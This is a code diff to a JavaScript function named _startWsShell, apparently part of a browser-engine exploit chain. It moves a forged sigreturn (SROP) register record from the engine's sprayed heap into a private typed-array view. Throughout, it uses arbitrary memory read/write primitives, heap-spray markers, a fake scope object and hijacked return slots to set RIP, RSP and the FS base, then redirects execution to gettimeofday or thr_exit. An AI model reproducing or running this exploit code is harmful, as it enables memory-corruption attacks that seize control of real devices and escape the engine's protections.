@@ -5482,36 +5482,40 @@ function _startWsShell(){
           reply.retSlot={addr:'0x'+retSlotAddr.toString(16),provenance:'V70 constant cfr-0x328 across four boots'};
           SF('2 direct retSlot=0x'+retSlotAddr.toString(16)+' (cfr-0x328)');
 
-          /* (2) THE PARENT RECORD AT THE FAKE SCOPE (srop25). THE MBUF IS
-           * NOT A PRIVATE BUFFER: it is a sprayed marker buffer in the
-           * engine's live heap (the mPat +0x88/+0xB8 pattern scan), the
-           * fake scope = MBUF+0x80 = the shell's TUNED call-safe slot, and
-           * R/B2 (MBUF+0x1000/0x2080) = the NEIGHBORING SPRAY SLOTS whose
-           * bulk writes corrupted live heap objects (the rehearsal deaths).
-           * srop24's fire shape is right, the REGION was wrong. THE RECORD:
-           * at CAP (the tuned fake), the head +0x00-0x40 PRESERVED (the
-           * tuned zeros + the VM pair), +0x48-0x4F0 zeroed (the fire's
-           * record shape, proven call-safe through the srop12-15 installs),
-           * the fire's gates, the discovered FS base, the patches. NO
-           * writes anywhere else. */
+          /* (2) THE PARENT RECORD IN THE VIEW (srop26). THE MBUF IS THE
+           * ENGINE'S LIVE HEAP (the mPat marker scan) - the fake scope =
+           * the shell's TUNED 0x40-byte slot, and EVERY record tail
+           * (+0x48-0x4C0) spilled into the NEIGHBORING SPRAY SLOTS - the
+           * corruption behind the rehearsal deaths (srop21-25) and riding
+           * alongside the FS-base deaths (srop12-19). THE ONLY ENGINE-FREE
+           * REGION = the shell's private 64MB view (S.viewBase, the
+           * typed-array Gigacage backing: GC-free, engine-free). SROP26
+           * builds the tuned fake scope + the fire-shape record ENTIRELY in
+           * the view: VF = viewBase+0x3000000 (deep, away from the shell's
+           * early scratch), 0x4F0 bytes zeroed, the VM pair copied from the
+           * real fake scope, the gates, the discovered FS base, and the
+           * mode patches. THE CALL: scopeSlot <- VF, RDI = VF. */
           var CTX=CAP+0x1000n,STK=CAP+0x2F00n,WIT=CAP+0x3000n;
+          var VF=S.viewBase+0x3000000n;
           for(var zS=0;zS<0x500/8;zS++)S.absWrite(CTX+BigInt(zS*8),0n);
           S.absWrite(WIT,0n);
           S.absWrite(STK,lkS+0x13EC0n);
           reply.vm38='0x'+S.absRead(S.fakeScope+0x38n,8)[0].toString(16);
-          for(var zR=0x48;zR<0x4F0;zR+=8)S.absWrite(CAP+BigInt(zR),0n);
+          for(var zR=0;zR<0x4F0;zR+=8)S.absWrite(VF+BigInt(zR),0n);
+          S.absWrite(VF+0x38n,S.absRead(CAP+0x38n,8)[0]);             /* vm38 = the calibrated VM */
+          S.absWrite(VF+0x40n,S.absRead(CAP+0x40n,8)[0]);             /* vm40 = the neighbor */
           /* the fire's gate set + the new fixes: */
-          S.absWrite(CAP+0x0C0n,0x43n);
-          S.absWrite(CAP+0x0D0n,0n);           /* mc_flags=0 = the 814b shape: no FP restore */
-          S.absWrite(CAP+0x0E8n,0x43n);
-          S.absWrite(CAP+0x0F0n,0x202n);
-          S.absWrite(CAP+0x100n,0x3Bn);
-          S.absWrite(CAP+0x108n,0x480n);
-          S.absWrite(CAP+0x110n,0x10002n);
-          S.absWrite(CAP+0x118n,0x20001n);
-          S.absWrite(CAP+0x480n,fsB);          /* THE FS BASE FIX */
-          S.absWrite(CAP+0x488n,0n);
-          reply.recordFireShape=true;
+          S.absWrite(VF+0x0C0n,0x43n);
+          S.absWrite(VF+0x0D0n,0n);            /* mc_flags=0 = the 814b shape: no FP restore */
+          S.absWrite(VF+0x0E8n,0x43n);
+          S.absWrite(VF+0x0F0n,0x202n);
+          S.absWrite(VF+0x100n,0x3Bn);
+          S.absWrite(VF+0x108n,0x480n);
+          S.absWrite(VF+0x110n,0x10002n);
+          S.absWrite(VF+0x118n,0x20001n);
+          S.absWrite(VF+0x480n,fsB);           /* THE FS BASE FIX */
+          S.absWrite(VF+0x488n,0n);
+          reply.recordView=true;
           /* the child starts at the identified Thrd_exit import. Only the
            * proven manual gates are used; parent TLS/stack state is not copied. */
           S.absWrite(CTX+0x048n,0n);
@@ -5537,44 +5541,43 @@ function _startWsShell(){
           }
           var isRT=(msg.mode==='rt');
 
-          /* (3) THE MODE PATCHES on the record at CAP. mode=ic = the
+          /* (3) THE MODE PATCHES on the record at VF. mode=ic = the
            * INSTALL-CONTROL: a harmless gettimeofday through the SAME call
-           * site with RDI=CAP (its push writes the return address; its ret
+           * site with RDI=VF (its push writes the return address; its ret
            * pops but LEAVES the value), then RIP = that value and RSP =
            * cfr-0x320 - the iretq resumes the trampoline exactly as a
            * normal callee return, no target runs. SURVIVES = the install
            * proven; DIES = the install itself. rt/real = the target modes
-           * (the rt's tv lands at CAP+0x500, inside the record's zeroed
-           * region, no neighbor writes). */
+           * (the rt's tv lands at VF+0x500, inside the zeroed region). */
           var isIC=(msg.mode==='ic');
           if(isIC){
-            SF_CALL(lkS+0xB50n,CAP);
+            SF_CALL(lkS+0xB50n,VF);
             var retv=S.absRead(retSlotAddr,8)[0];
             reply.icRet='0x'+retv.toString(16);
             if(!(retv>=0x800000000n&&retv<0x1000000000n)){
               reply.err='retSlot still not a code return after the rehearsal';break;
             }
-            S.absWrite(CAP+0x0E0n,retv);
-            S.absWrite(CAP+0x0F8n,retSlotAddr+0x8n);
-            S.absWrite(CAP+0x048n,0n);
-            S.absWrite(CAP+0x050n,0n);
+            S.absWrite(VF+0x0E0n,retv);
+            S.absWrite(VF+0x0F8n,retSlotAddr+0x8n);
+            S.absWrite(VF+0x048n,0n);
+            S.absWrite(VF+0x050n,0n);
             SF('3 INSTALL-CONTROL RIP=[retSlot post-rehearsal] RSP=cfr-0x320 (no target)');
           }else if(msg.mode==='rt'){
-            S.absWrite(CAP+0x048n,CAP+0x500n); /* the tv buffer = inside the record's zeroed region */
-            S.absWrite(CAP+0x050n,0n);         /* tz = NULL */
-            S.absWrite(CAP+0x0E0n,lkS+0xB50n);
+            S.absWrite(VF+0x048n,VF+0x500n);   /* the tv buffer = inside the zeroed region */
+            S.absWrite(VF+0x050n,0n);          /* tz = NULL */
+            S.absWrite(VF+0x0E0n,lkS+0xB50n);
             SF('3 ROUNDTRIP target=gettimeofday (no thr_create)');
           }else{
-            S.absWrite(CAP+0x048n,CTX);
-            S.absWrite(CAP+0x050n,WIT);
-            S.absWrite(CAP+0x0E0n,lkS+0x13D20n);
+            S.absWrite(VF+0x048n,CTX);
+            S.absWrite(VF+0x050n,WIT);
+            S.absWrite(VF+0x0E0n,lkS+0x13D20n);
             SF('3 child RIP=thr_exit parent=(RDI=ctx,RSI=wit,RDX=0) fsbase installed');
           }
-          S.absWrite(CAP+0x058n,0n);
-          S.absWrite(CAP+0x0F8n,retSlotAddr);
+          S.absWrite(VF+0x058n,0n);
+          S.absWrite(VF+0x0F8n,retSlotAddr);
 
-          /* (4) THE INSTALL: sigreturn reads the record at RDI=CAP. */
-          var origSr=SF_CALL(lkS+0x13ED0n,CAP);
+          /* (4) THE INSTALL: sigreturn reads the record at RDI=VF. */
+          var origSr=SF_CALL(lkS+0x13ED0n,VF);
           reply.sigreturnRestored=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origSr);
           if(isIC){
             SF('4 INSTALL-CONTROL SURVIVED - the install is PROVEN');
@@ -5582,7 +5585,7 @@ function _startWsShell(){
             break;
           }
           if(isRT){
-            var tvSec=S.absRead(CAP+0x500n,8)[0],tvUsec=S.absRead(CAP+0x508n,8)[0];
+            var tvSec=S.absRead(VF+0x500n,8)[0],tvUsec=S.absRead(VF+0x508n,8)[0];
             reply.roundtrip={sec:'0x'+tvSec.toString(16),usec:'0x'+tvUsec.toString(16),
                              valid:(tvSec>0x40000000n&&tvSec<0x80000000n&&tvUsec<0xF4240n)};
             SF('4 ROUNDTRIP parent ALIVE sec=0x'+tvSec.toString(16)+' usec=0x'+tvUsec.toString(16));
